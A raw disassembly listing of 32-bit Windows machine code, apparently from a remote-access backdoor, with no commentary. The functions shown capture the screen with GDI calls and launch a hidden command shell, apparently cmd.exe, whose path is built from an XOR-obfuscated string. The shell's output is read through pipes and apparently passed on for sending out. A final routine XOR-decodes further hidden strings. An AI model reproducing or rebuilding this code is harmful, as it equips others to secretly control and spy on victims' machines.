  4034c4:	89 55 d8             	mov    %edx,-0x28(%ebp)
  4034c7:	8b 45 0c             	mov    0xc(%ebp),%eax
  4034ca:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4034cd:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4034d0:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  4034d3:	8b 55 14             	mov    0x14(%ebp),%edx
  4034d6:	89 55 d4             	mov    %edx,-0x2c(%ebp)
  4034d9:	6a 08                	push   $0x8
  4034db:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4034de:	50                   	push   %eax
  4034df:	ff 15 f4 d8 40 00    	call   *0x40d8f4
  4034e5:	89 45 d0             	mov    %eax,-0x30(%ebp)
  4034e8:	6a 0a                	push   $0xa
  4034ea:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  4034ed:	51                   	push   %ecx
  4034ee:	ff 15 f4 d8 40 00    	call   *0x40d8f4
  4034f4:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4034f7:	83 7d d8 00          	cmpl   $0x0,-0x28(%ebp)
  4034fb:	7d 07                	jge    0x403504
  4034fd:	c7 45 d8 00 00 00 00 	movl   $0x0,-0x28(%ebp)
  403504:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  403508:	7d 07                	jge    0x403511
  40350a:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  403511:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  403514:	3b 55 d0             	cmp    -0x30(%ebp),%edx
  403517:	7e 06                	jle    0x40351f
  403519:	8b 45 d0             	mov    -0x30(%ebp),%eax
  40351c:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  40351f:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  403522:	3b 4d fc             	cmp    -0x4(%ebp),%ecx
  403525:	7e 06                	jle    0x40352d
  403527:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40352a:	89 55 d4             	mov    %edx,-0x2c(%ebp)
  40352d:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  403530:	2b 45 d8             	sub    -0x28(%ebp),%eax
  403533:	89 45 e0             	mov    %eax,-0x20(%ebp)
  403536:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  403539:	2b 4d f8             	sub    -0x8(%ebp),%ecx
  40353c:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  40353f:	8b 55 ec             	mov    -0x14(%ebp),%edx
  403542:	52                   	push   %edx
  403543:	8b 45 e0             	mov    -0x20(%ebp),%eax
  403546:	50                   	push   %eax
  403547:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  40354a:	51                   	push   %ecx
  40354b:	ff 15 f8 d8 40 00    	call   *0x40d8f8
  403551:	89 45 f0             	mov    %eax,-0x10(%ebp)
  403554:	8b 55 f0             	mov    -0x10(%ebp),%edx
  403557:	52                   	push   %edx
  403558:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40355b:	50                   	push   %eax
  40355c:	ff 15 fc d8 40 00    	call   *0x40d8fc
  403562:	89 45 f4             	mov    %eax,-0xc(%ebp)
  403565:	68 20 00 cc 00       	push   $0xcc0020
  40356a:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40356d:	51                   	push   %ecx
  40356e:	8b 55 d8             	mov    -0x28(%ebp),%edx
  403571:	52                   	push   %edx
  403572:	8b 45 dc             	mov    -0x24(%ebp),%eax
  403575:	50                   	push   %eax
  403576:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  403579:	51                   	push   %ecx
  40357a:	8b 55 e0             	mov    -0x20(%ebp),%edx
  40357d:	52                   	push   %edx
  40357e:	6a 00                	push   $0x0
  403580:	6a 00                	push   $0x0
  403582:	8b 45 e8             	mov    -0x18(%ebp),%eax
  403585:	50                   	push   %eax
  403586:	ff 15 00 d9 40 00    	call   *0x40d900
  40358c:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40358f:	51                   	push   %ecx
  403590:	8b 55 e8             	mov    -0x18(%ebp),%edx
  403593:	52                   	push   %edx
  403594:	ff 15 fc d8 40 00    	call   *0x40d8fc
  40359a:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40359d:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4035a0:	50                   	push   %eax
  4035a1:	ff 15 04 d9 40 00    	call   *0x40d904
  4035a7:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  4035aa:	51                   	push   %ecx
  4035ab:	ff 15 04 d9 40 00    	call   *0x40d904
  4035b1:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4035b4:	8b e5                	mov    %ebp,%esp
  4035b6:	5d                   	pop    %ebp
  4035b7:	c3                   	ret
  4035b8:	cc                   	int3
  4035b9:	cc                   	int3
  4035ba:	cc                   	int3
  4035bb:	cc                   	int3
  4035bc:	cc                   	int3
  4035bd:	cc                   	int3
  4035be:	cc                   	int3
  4035bf:	cc                   	int3
  4035c0:	55                   	push   %ebp
  4035c1:	8b ec                	mov    %esp,%ebp
  4035c3:	83 ec 60             	sub    $0x60,%esp
  4035c6:	56                   	push   %esi
  4035c7:	57                   	push   %edi
  4035c8:	e8 93 fc ff ff       	call   0x403260
  4035cd:	6a 0f                	push   $0xf
  4035cf:	ff 15 d8 d8 40 00    	call   *0x40d8d8
  4035d5:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4035d8:	8d 45 a8             	lea    -0x58(%ebp),%eax
  4035db:	50                   	push   %eax
  4035dc:	6a 18                	push   $0x18
  4035de:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4035e1:	51                   	push   %ecx
  4035e2:	ff 15 dc d8 40 00    	call   *0x40d8dc
  4035e8:	c7 45 c0 28 00 00 00 	movl   $0x28,-0x40(%ebp)
  4035ef:	8b 55 ac             	mov    -0x54(%ebp),%edx
  4035f2:	89 55 c4             	mov    %edx,-0x3c(%ebp)
  4035f5:	8b 45 b0             	mov    -0x50(%ebp),%eax
  4035f8:	89 45 c8             	mov    %eax,-0x38(%ebp)
  4035fb:	b9 01 00 00 00       	mov    $0x1,%ecx
  403600:	66 89 4d cc          	mov    %cx,-0x34(%ebp)
  403604:	66 8b 55 0c          	mov    0xc(%ebp),%dx
  403608:	66 89 55 ce          	mov    %dx,-0x32(%ebp)
  40360c:	c7 45 d0 00 00 00 00 	movl   $0x0,-0x30(%ebp)
  403613:	c7 45 d4 00 00 00 00 	movl   $0x0,-0x2c(%ebp)
  40361a:	c7 45 d8 00 00 00 00 	movl   $0x0,-0x28(%ebp)
  403621:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  403628:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%ebp)
  40362f:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%ebp)
  403636:	0f b7 4d ce          	movzwl -0x32(%ebp),%ecx
  40363a:	b8 01 00 00 00       	mov    $0x1,%eax
  40363f:	d3 e0                	shl    %cl,%eax
  403641:	89 45 e8             	mov    %eax,-0x18(%ebp)
  403644:	81 7d e8 00 01 00 00 	cmpl   $0x100,-0x18(%ebp)
  40364b:	7e 07                	jle    0x403654
  40364d:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  403654:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  403657:	8b 55 c0             	mov    -0x40(%ebp),%edx
  40365a:	8d 04 8a             	lea    (%edx,%ecx,4),%eax
  40365d:	89 45 a0             	mov    %eax,-0x60(%ebp)
  403660:	6a 00                	push   $0x0
  403662:	ff 15 bc d8 40 00    	call   *0x40d8bc
  403668:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40366b:	6a 00                	push   $0x0
  40366d:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  403670:	51                   	push   %ecx
  403671:	8b 55 f4             	mov    -0xc(%ebp),%edx
  403674:	52                   	push   %edx
  403675:	ff 15 e0 d8 40 00    	call   *0x40d8e0
  40367b:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40367e:	8b 45 f4             	mov    -0xc(%ebp),%eax
  403681:	50                   	push   %eax
  403682:	ff 15 e4 d8 40 00    	call   *0x40d8e4
  403688:	8b 4d a0             	mov    -0x60(%ebp),%ecx
  40368b:	51                   	push   %ecx
  40368c:	6a 00                	push   $0x0
  40368e:	ff 15 50 d8 40 00    	call   *0x40d850
  403694:	89 45 f0             	mov    %eax,-0x10(%ebp)
  403697:	83 7d f0 00          	cmpl   $0x0,-0x10(%ebp)
  40369b:	75 23                	jne    0x4036c0
  40369d:	6a 00                	push   $0x0
  40369f:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4036a2:	52                   	push   %edx
  4036a3:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4036a6:	50                   	push   %eax
  4036a7:	ff 15 e0 d8 40 00    	call   *0x40d8e0
  4036ad:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4036b0:	51                   	push   %ecx
  4036b1:	6a 00                	push   $0x0
  4036b3:	ff 15 c0 d8 40 00    	call   *0x40d8c0
  4036b9:	33 c0                	xor    %eax,%eax
  4036bb:	e9 35 01 00 00       	jmp    0x4037f5
  4036c0:	8b 55 f0             	mov    -0x10(%ebp),%edx
  4036c3:	89 55 f8             	mov    %edx,-0x8(%ebp)
  4036c6:	b9 0a 00 00 00       	mov    $0xa,%ecx
  4036cb:	8d 75 c0             	lea    -0x40(%ebp),%esi
  4036ce:	8b 7d f8             	mov    -0x8(%ebp),%edi
  4036d1:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4036d3:	6a 00                	push   $0x0
  4036d5:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4036d8:	50                   	push   %eax
  4036d9:	6a 00                	push   $0x0
  4036db:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  4036de:	51                   	push   %ecx
  4036df:	6a 00                	push   $0x0
  4036e1:	8b 55 08             	mov    0x8(%ebp),%edx
  4036e4:	52                   	push   %edx
  4036e5:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4036e8:	50                   	push   %eax
  4036e9:	ff 15 e8 d8 40 00    	call   *0x40d8e8
  4036ef:	8b 75 f8             	mov    -0x8(%ebp),%esi
  4036f2:	b9 0a 00 00 00       	mov    $0xa,%ecx
  4036f7:	8d 7d c0             	lea    -0x40(%ebp),%edi
  4036fa:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4036fc:	83 7d d4 00          	cmpl   $0x0,-0x2c(%ebp)
  403700:	75 20                	jne    0x403722
  403702:	0f b7 4d ce          	movzwl -0x32(%ebp),%ecx
  403706:	8b c1                	mov    %ecx,%eax
  403708:	0f af 45 c4          	imul   -0x3c(%ebp),%eax
  40370c:	83 c0 1f             	add    $0x1f,%eax
  40370f:	83 e0 e0             	and    $0xffffffe0,%eax
  403712:	99                   	cltd
  403713:	83 e2 07             	and    $0x7,%edx
  403716:	03 c2                	add    %edx,%eax
  403718:	c1 f8 03             	sar    $0x3,%eax
  40371b:	0f af 45 c8          	imul   -0x38(%ebp),%eax
  40371f:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  403722:	8b 55 a0             	mov    -0x60(%ebp),%edx
  403725:	03 55 d4             	add    -0x2c(%ebp),%edx
  403728:	89 55 a0             	mov    %edx,-0x60(%ebp)
  40372b:	6a 02                	push   $0x2
  40372d:	8b 45 a0             	mov    -0x60(%ebp),%eax
  403730:	50                   	push   %eax
  403731:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  403734:	51                   	push   %ecx
  403735:	ff 15 54 d8 40 00    	call   *0x40d854
  40373b:	89 45 a4             	mov    %eax,-0x5c(%ebp)
  40373e:	83 7d a4 00          	cmpl   $0x0,-0x5c(%ebp)
  403742:	74 08                	je     0x40374c
  403744:	8b 55 a4             	mov    -0x5c(%ebp),%edx
  403747:	89 55 f0             	mov    %edx,-0x10(%ebp)
  40374a:	eb 2a                	jmp    0x403776
  40374c:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40374f:	50                   	push   %eax
  403750:	ff 15 64 d8 40 00    	call   *0x40d864
  403756:	6a 00                	push   $0x0
  403758:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40375b:	51                   	push   %ecx
  40375c:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40375f:	52                   	push   %edx
  403760:	ff 15 e0 d8 40 00    	call   *0x40d8e0
  403766:	8b 45 f4             	mov    -0xc(%ebp),%eax
  403769:	50                   	push   %eax
  40376a:	6a 00                	push   $0x0
  40376c:	ff 15 c0 d8 40 00    	call   *0x40d8c0
  403772:	33 c0                	xor    %eax,%eax
  403774:	eb 7f                	jmp    0x4037f5
  403776:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  403779:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  40377c:	6a 00                	push   $0x0
  40377e:	8b 55 f8             	mov    -0x8(%ebp),%edx
  403781:	52                   	push   %edx
  403782:	8b 45 e8             	mov    -0x18(%ebp),%eax
  403785:	8b 4d c0             	mov    -0x40(%ebp),%ecx
  403788:	8d 14 81             	lea    (%ecx,%eax,4),%edx
  40378b:	03 55 f8             	add    -0x8(%ebp),%edx
  40378e:	52                   	push   %edx
  40378f:	8b 45 c8             	mov    -0x38(%ebp),%eax
  403792:	50                   	push   %eax
  403793:	6a 00                	push   $0x0
  403795:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403798:	51                   	push   %ecx
  403799:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40379c:	52                   	push   %edx
  40379d:	ff 15 e8 d8 40 00    	call   *0x40d8e8
  4037a3:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4037a6:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  4037aa:	75 2a                	jne    0x4037d6
  4037ac:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4037af:	50                   	push   %eax
  4037b0:	ff 15 64 d8 40 00    	call   *0x40d864
  4037b6:	6a 00                	push   $0x0
  4037b8:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4037bb:	51                   	push   %ecx
  4037bc:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4037bf:	52                   	push   %edx
  4037c0:	ff 15 e0 d8 40 00    	call   *0x40d8e0
  4037c6:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4037c9:	50                   	push   %eax
  4037ca:	6a 00                	push   $0x0
  4037cc:	ff 15 c0 d8 40 00    	call   *0x40d8c0
  4037d2:	33 c0                	xor    %eax,%eax
  4037d4:	eb 1f                	jmp    0x4037f5
  4037d6:	6a 00                	push   $0x0
  4037d8:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4037db:	51                   	push   %ecx
  4037dc:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4037df:	52                   	push   %edx
  4037e0:	ff 15 e0 d8 40 00    	call   *0x40d8e0
  4037e6:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4037e9:	50                   	push   %eax
  4037ea:	6a 00                	push   $0x0
  4037ec:	ff 15 c0 d8 40 00    	call   *0x40d8c0
  4037f2:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4037f5:	5f                   	pop    %edi
  4037f6:	5e                   	pop    %esi
  4037f7:	8b e5                	mov    %ebp,%esp
  4037f9:	5d                   	pop    %ebp
  4037fa:	c3                   	ret
  4037fb:	cc                   	int3
  4037fc:	cc                   	int3
  4037fd:	cc                   	int3
  4037fe:	cc                   	int3
  4037ff:	cc                   	int3
  403800:	cc                   	int3
  403801:	cc                   	int3
  403802:	cc                   	int3
  403803:	cc                   	int3
  403804:	cc                   	int3
  403805:	cc                   	int3
  403806:	cc                   	int3
  403807:	cc                   	int3
  403808:	cc                   	int3
  403809:	cc                   	int3
  40380a:	cc                   	int3
  40380b:	cc                   	int3
  40380c:	cc                   	int3
  40380d:	cc                   	int3
  40380e:	cc                   	int3
  40380f:	cc                   	int3
  403810:	55                   	push   %ebp
  403811:	8b ec                	mov    %esp,%ebp
  403813:	81 ec 30 0b 00 00    	sub    $0xb30,%esp
  403819:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  403820:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  403827:	c6 85 20 fd ff ff 00 	movb   $0x0,-0x2e0(%ebp)
  40382e:	68 2b 01 00 00       	push   $0x12b
  403833:	6a 00                	push   $0x0
  403835:	8d 85 21 fd ff ff    	lea    -0x2df(%ebp),%eax
  40383b:	50                   	push   %eax
  40383c:	e8 d3 40 00 00       	call   0x407914
  403841:	83 c4 0c             	add    $0xc,%esp
  403844:	c6 85 20 f5 ff ff 00 	movb   $0x0,-0xae0(%ebp)
  40384b:	68 ff 07 00 00       	push   $0x7ff
  403850:	6a 00                	push   $0x0
  403852:	8d 8d 21 f5 ff ff    	lea    -0xadf(%ebp),%ecx
  403858:	51                   	push   %ecx
  403859:	e8 b6 40 00 00       	call   0x407914
  40385e:	83 c4 0c             	add    $0xc,%esp
  403861:	c7 85 d4 f4 ff ff 00 	movl   $0x0,-0xb2c(%ebp)
  403868:	00 00 00 
  40386b:	c7 85 50 fe ff ff 00 	movl   $0x0,-0x1b0(%ebp)
  403872:	00 00 00 
  403875:	8d 95 70 fe ff ff    	lea    -0x190(%ebp),%edx
  40387b:	52                   	push   %edx
  40387c:	e8 2f df ff ff       	call   0x4017b0
  403881:	83 c4 04             	add    $0x4,%esp
  403884:	c7 85 54 fe ff ff 0c 	movl   $0xc,-0x1ac(%ebp)
  40388b:	00 00 00 
  40388e:	c7 85 58 fe ff ff 00 	movl   $0x0,-0x1a8(%ebp)
  403895:	00 00 00 
  403898:	c7 85 5c fe ff ff 01 	movl   $0x1,-0x1a4(%ebp)
  40389f:	00 00 00 
  4038a2:	6a 00                	push   $0x0
  4038a4:	8d 85 54 fe ff ff    	lea    -0x1ac(%ebp),%eax
  4038aa:	50                   	push   %eax
  4038ab:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  4038ae:	51                   	push   %ecx
  4038af:	8d 55 f8             	lea    -0x8(%ebp),%edx
  4038b2:	52                   	push   %edx
  4038b3:	ff 95 14 ff ff ff    	call   *-0xec(%ebp)
  4038b9:	85 c0                	test   %eax,%eax
  4038bb:	75 0a                	jne    0x4038c7
  4038bd:	e9 a2 01 00 00       	jmp    0x403a64
  4038c2:	e9 9d 01 00 00       	jmp    0x403a64
  4038c7:	c7 85 d8 f4 ff ff 44 	movl   $0x44,-0xb28(%ebp)
  4038ce:	00 00 00 
  4038d1:	8d 85 d8 f4 ff ff    	lea    -0xb28(%ebp),%eax
  4038d7:	50                   	push   %eax
  4038d8:	ff 95 18 ff ff ff    	call   *-0xe8(%ebp)
  4038de:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4038e1:	89 8d 18 f5 ff ff    	mov    %ecx,-0xae8(%ebp)
  4038e7:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4038ea:	89 95 14 f5 ff ff    	mov    %edx,-0xaec(%ebp)
  4038f0:	33 c0                	xor    %eax,%eax
  4038f2:	66 89 85 08 f5 ff ff 	mov    %ax,-0xaf8(%ebp)
  4038f9:	c7 85 04 f5 ff ff 01 	movl   $0x101,-0xafc(%ebp)
  403900:	01 00 00 
  403903:	68 2c 01 00 00       	push   $0x12c
  403908:	8d 8d 20 fd ff ff    	lea    -0x2e0(%ebp),%ecx
  40390e:	51                   	push   %ecx
  40390f:	ff 95 9c fe ff ff    	call   *-0x164(%ebp)
  403915:	c7 85 d0 f4 ff ff 00 	movl   $0x0,-0xb30(%ebp)
  40391c:	00 00 00 
  40391f:	8b 95 d0 f4 ff ff    	mov    -0xb30(%ebp),%edx
  403925:	0f b6 82 00 b0 40 00 	movzbl 0x40b000(%edx),%eax
  40392c:	85 c0                	test   %eax,%eax
  40392e:	74 2d                	je     0x40395d
  403930:	8b 8d d0 f4 ff ff    	mov    -0xb30(%ebp),%ecx
  403936:	0f b6 91 00 b0 40 00 	movzbl 0x40b000(%ecx),%edx
  40393d:	83 f2 5a             	xor    $0x5a,%edx
  403940:	8b 85 d0 f4 ff ff    	mov    -0xb30(%ebp),%eax
  403946:	88 90 00 b0 40 00    	mov    %dl,0x40b000(%eax)
  40394c:	8b 8d d0 f4 ff ff    	mov    -0xb30(%ebp),%ecx
  403952:	83 c1 01             	add    $0x1,%ecx
  403955:	89 8d d0 f4 ff ff    	mov    %ecx,-0xb30(%ebp)
  40395b:	eb c2                	jmp    0x40391f
  40395d:	68 90 99 40 00       	push   $0x409990
  403962:	8d 95 20 fd ff ff    	lea    -0x2e0(%ebp),%edx
  403968:	52                   	push   %edx
  403969:	e8 f6 3f 00 00       	call   0x407964
  40396e:	83 c4 08             	add    $0x8,%esp
  403971:	68 00 b0 40 00       	push   $0x40b000
  403976:	8d 85 20 fd ff ff    	lea    -0x2e0(%ebp),%eax
  40397c:	50                   	push   %eax
  40397d:	e8 e2 3f 00 00       	call   0x407964
  403982:	83 c4 08             	add    $0x8,%esp
  403985:	68 94 99 40 00       	push   $0x409994
  40398a:	8d 8d 20 fd ff ff    	lea    -0x2e0(%ebp),%ecx
  403990:	51                   	push   %ecx
  403991:	e8 ce 3f 00 00       	call   0x407964
  403996:	83 c4 08             	add    $0x8,%esp
  403999:	8b 55 0c             	mov    0xc(%ebp),%edx
  40399c:	52                   	push   %edx
  40399d:	8d 85 20 fd ff ff    	lea    -0x2e0(%ebp),%eax
  4039a3:	50                   	push   %eax
  4039a4:	e8 bb 3f 00 00       	call   0x407964
  4039a9:	83 c4 08             	add    $0x8,%esp
  4039ac:	8d 8d 60 fe ff ff    	lea    -0x1a0(%ebp),%ecx
  4039b2:	51                   	push   %ecx
  4039b3:	8d 95 d8 f4 ff ff    	lea    -0xb28(%ebp),%edx
  4039b9:	52                   	push   %edx
  4039ba:	6a 00                	push   $0x0
  4039bc:	6a 00                	push   $0x0
  4039be:	6a 00                	push   $0x0
  4039c0:	6a 01                	push   $0x1
  4039c2:	6a 00                	push   $0x0
  4039c4:	6a 00                	push   $0x0
  4039c6:	8d 85 20 fd ff ff    	lea    -0x2e0(%ebp),%eax
  4039cc:	50                   	push   %eax
  4039cd:	6a 00                	push   $0x0
  4039cf:	ff 95 8c fe ff ff    	call   *-0x174(%ebp)
  4039d5:	85 c0                	test   %eax,%eax
  4039d7:	75 0a                	jne    0x4039e3
  4039d9:	e9 86 00 00 00       	jmp    0x403a64
  4039de:	e9 81 00 00 00       	jmp    0x403a64
  4039e3:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4039e6:	51                   	push   %ecx
  4039e7:	ff 95 88 fe ff ff    	call   *-0x178(%ebp)
  4039ed:	ba 01 00 00 00       	mov    $0x1,%edx
  4039f2:	85 d2                	test   %edx,%edx
  4039f4:	74 5d                	je     0x403a53
  4039f6:	6a 00                	push   $0x0
  4039f8:	8d 85 d4 f4 ff ff    	lea    -0xb2c(%ebp),%eax
  4039fe:	50                   	push   %eax
  4039ff:	68 00 08 00 00       	push   $0x800
  403a04:	8d 8d 20 f5 ff ff    	lea    -0xae0(%ebp),%ecx
  403a0a:	51                   	push   %ecx
  403a0b:	8b 55 f8             	mov    -0x8(%ebp),%edx
  403a0e:	52                   	push   %edx
  403a0f:	ff 95 a4 fe ff ff    	call   *-0x15c(%ebp)
  403a15:	85 c0                	test   %eax,%eax
  403a17:	75 02                	jne    0x403a1b
  403a19:	eb 38                	jmp    0x403a53
  403a1b:	6a 00                	push   $0x0
  403a1d:	6a 00                	push   $0x0
  403a1f:	8b 85 d4 f4 ff ff    	mov    -0xb2c(%ebp),%eax
  403a25:	50                   	push   %eax
  403a26:	8d 8d 20 f5 ff ff    	lea    -0xae0(%ebp),%ecx
  403a2c:	51                   	push   %ecx
  403a2d:	8b 55 08             	mov    0x8(%ebp),%edx
  403a30:	52                   	push   %edx
  403a31:	e8 4a eb ff ff       	call   0x402580
  403a36:	68 00 08 00 00       	push   $0x800
  403a3b:	6a 00                	push   $0x0
  403a3d:	8d 85 20 f5 ff ff    	lea    -0xae0(%ebp),%eax
  403a43:	50                   	push   %eax
  403a44:	e8 cb 3e 00 00       	call   0x407914
  403a49:	83 c4 0c             	add    $0xc,%esp
  403a4c:	6a 64                	push   $0x64
  403a4e:	ff 55 88             	call   *-0x78(%ebp)
  403a51:	eb 9a                	jmp    0x4039ed
  403a53:	6a 00                	push   $0x0
  403a55:	6a 01                	push   $0x1
  403a57:	6a 00                	push   $0x0
  403a59:	6a 00                	push   $0x0
  403a5b:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403a5e:	51                   	push   %ecx
  403a5f:	e8 1c eb ff ff       	call   0x402580
  403a64:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  403a68:	74 0a                	je     0x403a74
  403a6a:	8b 55 f8             	mov    -0x8(%ebp),%edx
  403a6d:	52                   	push   %edx
  403a6e:	ff 95 88 fe ff ff    	call   *-0x178(%ebp)
  403a74:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  403a78:	74 0a                	je     0x403a84
  403a7a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403a7d:	50                   	push   %eax
  403a7e:	ff 95 88 fe ff ff    	call   *-0x178(%ebp)
  403a84:	33 c0                	xor    %eax,%eax
  403a86:	8b e5                	mov    %ebp,%esp
  403a88:	5d                   	pop    %ebp
  403a89:	c3                   	ret
  403a8a:	cc                   	int3
  403a8b:	cc                   	int3
  403a8c:	cc                   	int3
  403a8d:	cc                   	int3
  403a8e:	cc                   	int3
  403a8f:	cc                   	int3
  403a90:	55                   	push   %ebp
  403a91:	8b ec                	mov    %esp,%ebp
  403a93:	81 ec 0c 01 00 00    	sub    $0x10c,%esp
  403a99:	c6 85 00 ff ff ff 00 	movb   $0x0,-0x100(%ebp)
  403aa0:	68 ff 00 00 00       	push   $0xff
  403aa5:	6a 00                	push   $0x0
  403aa7:	8d 85 01 ff ff ff    	lea    -0xff(%ebp),%eax
  403aad:	50                   	push   %eax
  403aae:	e8 61 3e 00 00       	call   0x407914
  403ab3:	83 c4 0c             	add    $0xc,%esp
  403ab6:	83 3d a4 de 40 00 00 	cmpl   $0x0,0x40dea4
  403abd:	0f 85 e2 00 00 00    	jne    0x403ba5
  403ac3:	c7 85 fc fe ff ff 00 	movl   $0x0,-0x104(%ebp)
  403aca:	00 00 00 
  403acd:	8b 8d fc fe ff ff    	mov    -0x104(%ebp),%ecx
  403ad3:	0f b6 91 4c b0 40 00 	movzbl 0x40b04c(%ecx),%edx
  403ada:	85 d2                	test   %edx,%edx
  403adc:	74 2d                	je     0x403b0b
  403ade:	8b 85 fc fe ff ff    	mov    -0x104(%ebp),%eax
  403ae4:	0f b6 88 4c b0 40 00 	movzbl 0x40b04c(%eax),%ecx
  403aeb:	83 f1 5a             	xor    $0x5a,%ecx
  403aee:	8b 95 fc fe ff ff    	mov    -0x104(%ebp),%edx
  403af4:	88 8a 4c b0 40 00    	mov    %cl,0x40b04c(%edx)
  403afa:	8b 85 fc fe ff ff    	mov    -0x104(%ebp),%eax
  403b00:	83 c0 01             	add    $0x1,%eax
  403b03:	89 85 fc fe ff ff    	mov    %eax,-0x104(%ebp)
  403b09:	eb c2                	jmp    0x403acd
  403b0b:	c7 85 f8 fe ff ff 00 	movl   $0x0,-0x108(%ebp)
  403b12:	00 00 00 
  403b15:	8b 8d f8 fe ff ff    	mov    -0x108(%ebp),%ecx
  403b1b:	0f b6 91 5c b0 40 00 	movzbl 0x40b05c(%ecx),%edx
  403b22:	85 d2                	test   %edx,%edx
  403b24:	74 2d                	je     0x403b53
  403b26:	8b 85 f8 fe ff ff    	mov    -0x108(%ebp),%eax
  403b2c:	0f b6 88 5c b0 40 00 	movzbl 0x40b05c(%eax),%ecx
  403b33:	83 f1 5a             	xor    $0x5a,%ecx
  403b36:	8b 95 f8 fe ff ff    	mov    -0x108(%ebp),%edx
  403b3c:	88 8a 5c b0 40 00    	mov    %cl,0x40b05c(%edx)
  403b42:	8b 85 f8 fe ff ff    	mov    -0x108(%ebp),%eax
  403b48:	83 c0 01             	add    $0x1,%eax
  403b4b:	89 85 f8 fe ff ff    	mov    %eax,-0x108(%ebp)
  403b51:	eb c2                	jmp    0x403b15
  403b53:	c7 85 f4 fe ff ff 00 	movl   $0x0,-0x10c(%ebp)
  403b5a:	00 00 00 
  403b5d:	8b 8d f4 fe ff ff    	mov    -0x10c(%ebp),%ecx
  403b63:	0f b6 91 54 b0 40 00 	movzbl 0x40b054(%ecx),%edx
  403b6a:	85 d2                	test   %edx,%edx
  403b6c:	74 2d                	je     0x403b9b
  403b6e:	8b 85 f4 fe ff ff    	mov    -0x10c(%ebp),%eax
  403b74:	0f b6 88 54 b0 40 00 	movzbl 0x40b054(%eax),%ecx
  403b7b:	83 f1 5a             	xor    $0x5a,%ecx
  403b7e:	8b 95 f4 fe ff ff    	mov    -0x10c(%ebp),%edx
  403b84:	88 8a 54 b0 40 00    	mov    %cl,0x40b054(%edx)
  403b8a:	8b 85 f4 fe ff ff    	mov    -0x10c(%ebp),%eax
  403b90:	83 c0 01             	add    $0x1,%eax
  403b93:	89 85 f4 fe ff ff    	mov    %eax,-0x10c(%ebp)
  403b99:	eb c2                	jmp    0x403b5d
  403b9b:	c7 05 a4 de 40 00 01 	movl   $0x1,0x40dea4
  403ba2:	00 00 00 
  403ba5:	68 4c b0 40 00       	push   $0x40b04c
  403baa:	8d 8d 00 ff ff ff    	lea    -0x100(%ebp),%ecx
  403bb0:	51                   	push   %ecx
  403bb1:	e8 52 3d 00 00       	call   0x407908
  403bb6:	83 c4 08             	add    $0x8,%esp
  403bb9:	68 5c b0 40 00       	push   $0x40b05c
  403bbe:	8d 95 00 ff ff ff    	lea    -0x100(%ebp),%edx
  403bc4:	52                   	push   %edx
  403bc5:	e8 9a 3d 00 00       	call   0x407964
